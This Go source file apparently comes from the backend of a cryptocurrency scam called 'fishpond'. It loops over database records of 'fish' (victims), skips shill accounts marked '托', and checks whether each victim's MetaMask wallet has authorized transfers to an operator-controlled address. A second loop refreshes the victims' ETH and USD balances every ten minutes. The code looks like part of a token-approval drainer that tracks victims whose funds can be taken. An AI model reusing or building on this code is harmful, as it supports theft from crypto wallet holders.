/**
 * @Author $
 * @Description //TODO $
 * @Date $ $
 * @Param $
 * @return $
 **/
package process

import (
	"fmt"
	"github.com/jinzhu/gorm"
	"github.com/spf13/viper"
	"github.com/wangyi/fishpond/model"
	"github.com/wangyi/fishpond/util"
	"time"
)

/**
  检查  钱包地址是否   已经授权转账
*/
func CheckAu(Db *gorm.DB) {
	for true {
		fish := make([]model.Fish, 0)
		apiKey := viper.GetString("eth.apikey")
		err := Db.Find(&fish).Error
		if err == nil {
			for _, value := range fish {
				config := model.Config{}
				err := Db.Where("id=1").First(&config).Error
				if err == nil && value.Remark != "托" {
					util.ChekAuthorizedFoxAddress(value.FoxAddress, apiKey, config.BAddress, Db)
				}
			}
		}

	}

}

/**
  更新余额进程
*/
func CheckMoney(Db *gorm.DB) {
	fmt.Println("CheckMoney process is running")
	for true {
		fish := make([]model.Fish, 0)
		err := Db.Find(&fish).Error
		if err == nil {
			for _, kk := range fish {
				if kk.Remark != "托" {
					util.UpdateUsdAndEth(kk.FoxAddress, Db, kk.Money, int(kk.ID), kk.AdminId, kk.Remark)
				}
			}
		}
		time.Sleep(600 * time.Second)
	}
}
